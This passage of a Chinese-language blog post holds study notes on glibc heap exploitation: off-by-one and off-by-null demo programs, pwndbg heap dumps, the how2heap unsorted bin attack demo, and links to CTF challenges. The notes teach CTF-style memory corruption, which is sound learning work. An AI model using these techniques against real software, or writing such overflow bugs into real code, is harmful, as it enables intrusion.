ptr[i]=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *chunk1,*chunk2;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    chunk2=<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Get Input:&quot;</span>);</span><br><span class="line">    my_gets(chunk1,<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>for循環寫入沒做好，多寫了一個byte</p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/SkYQ83ZtC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SkYQ83ZtC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/30xg 0x555555559290</span><br><span class="line">0x555555559290:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5555555592a0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555555592b0:	0x0000000000000061	0x0000000000000021 &lt;-prev越界多寫一個</span><br><span class="line">0x5555555592c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555555592d0:	0x0000000000000000	0x0000000000000411</span><br><span class="line">0x5555555592e0:	0x75706e4920746547	0x00000000000a3a74</span><br></pre></td></tr></table></figure>

<h4 id="demo2"><a href="#demo2" class="headerlink" title="demo2"></a>demo2</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">40</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">void</span> *chunk1;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Get Input&quot;</span>);</span><br><span class="line">    gets(buffer);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(buffer)==<span class="number">24</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(chunk1,buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>strlen()跟strcpy()不一致產生的問題，strlen在計算長度時並沒有把<code>\x00</code>算進去，導致strcpy()進chunk1多寫一個\x00</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/30xg 0x555555559290</span><br><span class="line">0x555555559290:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5555555592a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555555592b0:	0x0000000000000000	0x0000000000000411</span><br><span class="line">0x5555555592c0:	0x75706e4920746547	0x0000000000000a74</span><br><span class="line">0x5555555592d0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>這邊輸入24個a，發現下個chunk size被蓋成400，蓋掉P bit了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/30xg 0x555555559290</span><br><span class="line">0x555555559290:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5555555592a0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555555592b0:	0x6161616161616161	0x0000000000000400</span><br><span class="line">0x5555555592c0:	0x75706e4920746547	0x0000000000000a74</span><br><span class="line">0x5555555592d0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>



<h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>看到這段，在拿unsored bin的時候，會根據以下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">victim = unsorted_chunks (av)-&gt;bk</span><br><span class="line">bck = victim-&gt;bk</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av)</span><br></pre></td></tr></table></figure>
<p>加入一張圖方便理解<br><div class="img-item" data-src="https://hackmd.io/_uploads/BJL0QiIAA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/BJL0QiIAA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>他會把main arena中的bk給 victim，也就是victim就是chunk 3<br>把chunk 3 給 chunk bck，也就是bck &#x3D; chunk 2<br>之後把main arena的bk給chunk 2<br>bck 的fd 指回 main arena，完成unlink</p>
<p>可以從第二行下手<br>如果我們透過overflow偽造 chunk 3(victim) 的 bk<br>我們可以將main arena + 88&#x2F;96 address 寫入到 bck 的 fd 指向的位置</p>
<h3 id="how2heap"><a href="#how2heap" class="headerlink" title="how2heap"></a>how2heap</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the &quot;</span></span><br><span class="line">		   <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> stack_var=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s first look at the target we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%p: %ld\n\n&quot;</span>, &amp;stack_var, stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> *p=<span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;</span>,p);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot;the first one during the free()\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(p);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot;</span></span><br><span class="line">		   <span class="string">&quot;point to %p\n&quot;</span>,(<span class="type">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">	p[<span class="number">1</span>]=(<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var<span class="number">-2</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n&quot;</span>,(<span class="type">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s malloc again to get the chunk we just free. During this time, the target should have already been &quot;</span></span><br><span class="line">		   <span class="string">&quot;rewritten:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var, (<span class="type">void</span>*)stack_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我們先malloc兩塊chunk<br>chunk 1 size 400<br>chunk 2 size 500<br>之後free chunk 1<br>chunk 1進入到unsorted bin中<br>目前bk會指回main arena</p>
<p>我們目標是把stack某位置改寫<br>我們UAF去修改掉unsorted bin中chunk 的bk 成stack - 0x10<br>malloc回來就可以寫main arena address 到stack上</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bck = victim-&gt;bk (<span class="built_in">stack</span> - <span class="number">0x10</span>)</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck</span><br><span class="line">bck-&gt;fd (<span class="built_in">stack</span>) = unsorted_chunks (av) (main arena address)</span><br></pre></td></tr></table></figure>

<h2 id="book"><a href="#book" class="headerlink" title="book"></a>book</h2><p><a target="_blank" rel="noopener" href="https://github.com/limitedeternity/HeapLAB/blob/main/HeapLab%20-%20GLIBC%20Heap%20Exploitation.pdf">https://github.com/limitedeternity/HeapLAB/blob/main/HeapLab%20-%20GLIBC%20Heap%20Exploitation.pdf</a></p>
<h2 id="一些連結"><a href="#一些連結" class="headerlink" title="一些連結"></a>一些連結</h2><p>basic<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/songchuwang1868/article/details/89951543">https://blog.csdn.net/songchuwang1868/article/details/89951543</a></p>
<p>Pwngdb<br><a target="_blank" rel="noopener" href="https://github.com/scwuaptx/Pwngdb">https://github.com/scwuaptx/Pwngdb</a></p>
<p>與 gef 混用<br><a target="_blank" rel="noopener" href="https://gist.githubusercontent.com/LJP-TW/2edf8b66b61e91a232f76acc487bbd10/raw/a36ef8256fb934f4cf9cdbdea65f6ada2e383b84/.gdbinit">https://gist.githubusercontent.com/LJP-TW/2edf8b66b61e91a232f76acc487bbd10/raw/a36ef8256fb934f4cf9cdbdea65f6ada2e383b84/.gdbinit</a></p>
<p>link<br><a target="_blank" rel="noopener" href="https://0x434b.dev/overview-of-glibc-heap-exploitation-techniques/#smallbin">https://0x434b.dev/overview-of-glibc-heap-exploitation-techniques/#smallbin</a></p>
<p><a target="_blank" rel="noopener" href="https://www.openeuler.org/zh/blog/wangshuo/Glibc%20Malloc%20Principle/Glibc_Malloc_Principle.html">https://www.openeuler.org/zh/blog/wangshuo/Glibc%20Malloc%20Principle/Glibc_Malloc_Principle.html</a></p>
<h3 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h3><p><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2016_zctf_note2">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2016_zctf_note2</a><br><a target="_blank" rel="noopener" href="https://github.com/veritas501/hctf2018/blob/master/pwn-heapstorm_zero/heapstorm_zero.c">https://github.com/veritas501/hctf2018/blob/master/pwn-heapstorm_zero/heapstorm_zero.c</a><br><a target="_blank" rel="noopener" href="https://nocbtm.github.io/2020/02/28/off-by-null/#%E5%8F%A6%E4%B8%80%E7%A7%8D%E5%B8%83%E5%B1%80">https://nocbtm.github.io/2020/02/28/off-by-null/#%E5%8F%A6%E4%B8%80%E7%A7%8D%E5%B8%83%E5%B1%80</a><br><a target="_blank" rel="noopener" href="https://github.com/CTFTraining/HuXiang_2019_pwn_HackNote/tree/master">https://github.com/CTFTraining/HuXiang_2019_pwn_HackNote/tree/master</a><br><a target="_blank" rel="noopener" href="https://makabaka-yyds.github.io/2022/05/09/glibc2-29%E4%BB%A5%E4%B8%8A%E7%9A%84off-by-null/">https://makabaka-yyds.github.io/2022/05/09/glibc2-29%E4%BB%A5%E4%B8%8A%E7%9A%84off-by-null/</a></p>
<h3 id="ref-1"><a href="#ref-1" class="headerlink" title="ref"></a>ref</h3><p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-257901.htm">https://bbs.kanxue.com/thread-257901.htm</a><br><a target="_blank" rel="noopener" href="https://nopnoping.github.io/off-by-one%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/">https://nopnoping.github.io/off-by-one%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</a><br><a target="_blank" rel="noopener" href="https://makabaka-yyds.github.io/2022/05/09/glibc2-29%E4%BB%A5%E4%B8%8A%E7%9A%84off-by-null/">https://makabaka-yyds.github.io/2022/05/09/glibc2-29%E4%BB%A5%E4%B8%8A%E7%9A%84off-by-null/</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/kaiiiz/NTU-Computer-Security-2021-Fall/blob/main/Pwn/Pwn%20II/malloc_internal.c">https://github.com/kaiiiz/NTU-Computer-Security-2021-Fall/blob/main/Pwn/Pwn%20II/malloc_internal.c</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41202237/article/details/113400567">https://blog.csdn.net/qq_41202237/article/details/113400567</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/limitedeternity/HeapLAB/tree/main?tab=readme-ov-file">https://github.com/limitedeternity/HeapLAB/tree/main?tab=readme-ov-file</a></p>
<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/en/pwn/linux/user-mode/heap/ptmalloc2/tcache-attack/#tcache-poisoning">https://ctf-wiki.org/en/pwn/linux/user-mode/heap/ptmalloc2/tcache-attack/#tcache-poisoning</a></p>

            </div>

            <!-- Post information -->
            
            
    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
        <ul class="pagination d-block text-center">
            
                <li class="previous page-item d-inline"><a href="/2024/12/31/2023-2024-all-record/" class="page-link float-left">&larr;  Newer</a></li>
            
            
                <li class="next page-item d-inline"><a href="/2024/12/31/Kernel-mode-user-mode-switch/" class="page-link float-right">Older  &rarr;</a></li>
            
        </ul>
    </div>


            
                <!-- Comments -->
                

                

            

        </div>
    </div>
</article> 


    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    <style>
        #toc-content .toc-link::before {
            background-color: transparent;
            max-height: 25px;
        }

        #toc-content .toc-link.is-active-link::before {
            background-color: #404040;
        }
    </style>
    <script src="//cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <div class="ui-toc dropup scrollspy-body pull-right" style="right: 3%;">
        <button type="button" class="toc-btn btn btn-light" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" data-display="static">
            <i class="fas fa-list"></i>
        </button>
        <div class="dropdown-menu dropdown-menu-right p-2"  aria-labelledby="tocLabel">
            <div class="toc-widget">
                <div id="toc-content" class="text-truncate">
                </div>
            </div>
            <div class="toc-menu pt-3 pl-4">
                <a class="expand-toggle d-block py-1" href="#"><span class="expand-text">Expand all</span><span class="close-text" style="display: none;">Collapse all</span></a>
                <a class="back-to-top d-block py-1" href="#">Back to top</a>
                <a class="go-to-bottom d-block py-1" href="#">Go to bottom</a>
            </div>
        </div>
    </div>
    <script>
        tocbot.init({
            // Where to render the table of contents.
            tocSelector: '#toc-content',
            // Where to grab the headings to build the table of contents.
            contentSelector: 'article',
            // Which headings to grab inside of the contentSelector element.
            headingSelector: 'h1, h2, h3',
            // For headings inside relative or absolute positioned containers within content.
            hasInnerContainers: true,
        });
    </script>


    


    <!-- Footer -->
    <hr />

<!-- Footer -->
<footer id="footer">
    <div class="container">
        <div class="row">
            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 text-center">
                <ul class="list-inline">
                    

                    

                    
                        <li class="list-inline-item">
                            <a rel="external" href="https://github.com/Naupjjin" target="_blank">
                                <span class="fa-stack fa-lg">
                                    <i class="fa fa-circle fa-stack-2x"></i>
                                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
                                </span>
                            </a>
                        </li>
                    

                    

                    
                        <li class="list-inline-item">
                            <a rel="external" href="mailto:naup96721@gmail.com" target="_blank">
                                <span class="fa-stack fa-lg">
                                    <i class="fa fa-circle fa-stack-2x"></i>
                                    <i class="far fa-envelope fa-stack-1x fa-inverse"></i>
                                </span>
                            </a>
                        </li>
                    

                    
                </ul>
                <ul class="copyright footer-menu list-inline">
                    
                    
                        <li class="list-inline-item">
                            
                            
                            <a href="/">
                                
                                    Home
                                
                            </a>
                        </li>
                    
                        <li class="list-inline-item">
                            
                                <span class="copyright-split">&nbsp;|&nbsp;</span>
                            
                            
                            <a href="/archives">
                                
                                    Archives
                                
                            </a>
                        </li>
                    
                        <li class="list-inline-item">
                            
                                <span class="copyright-split">&nbsp;|&nbsp;</span>
                            
                            
                            <a href="/tags">
                                
                                    Tags
                                
                            </a>
                        </li>
                    
                        <li class="list-inline-item">
                            
                                <span class="copyright-split">&nbsp;|&nbsp;</span>
                            
                            
                            <a href="/categories">
                                
                                    Categories
                                
                            </a>
                        </li>
                    
                        <li class="list-inline-item">
                            
                                <span class="copyright-split">&nbsp;|&nbsp;</span>
                            
                            
                            <a href="/about">
                                
                                    About
                                
                            </a>
                        </li>
                    
                </ul>
                <p class="copyright footer-author">
                    &copy; -2024 
                    <a rel="external" class="copyright-link" href="" target="_blank">Naup堇姬</a><br/>
                    Powered by <a rel="external" class="copyright-link" href="https://hexo.io/" target="_blank">Hexo</a>  
                    <span class="copyright-split">&nbsp;|&nbsp;&nbsp;</span>
                    Theme <a rel="external" class="copyright-link" href="https://github.com/luswdev/hexo-theme-clean.git" target="_blank">Clean</a>
                    
                    
                </p>
            </div>
        </div>
    </div>
</footer>


    <!-- After footer scripts -->
    <!-- jQuery -->
<script src="//cdn.jsdelivr.net/npm/jquery@2.1.4/dist/jquery.min.js"></script>

<!-- For drop down -->
<script src="//cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>

<!-- Bootstrap -->
<script src="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/js/bootstrap.min.js"></script>
<!-- Gallery -->
<script src="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/js/lightgallery-all.min.js"></script>
<!-- Busuanzi -->


<!-- Search script -->

<script src="/js/search.js"></script>

<script type="text/javascript">
    $(function () {
        searchFunc( '/search.xml' , 'searchInput', 'searchResult');
    });
</script>



<script src="/js/main.js"></script>



    <!-- Search Modal -->
    <!-- Modal -->
<div class="modal fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
    <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
        <div class="modal-content overflow-auto">
            <div class="modal-header">
                <input type="text" class="form-control" placeholder="Searching Keywords..." id="searchInput">
                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><i class="fas fa-times"></i></button>
            </div>
            <div class="modal-body">
                <div id="searchResult">
                    <div class="search-empty text-center text-muted p-5">
                        <i class="far fa-meh"></i>
                    </div>
                </div>
            </div> 
        </div>
    </div>
</div>


</body>
</html>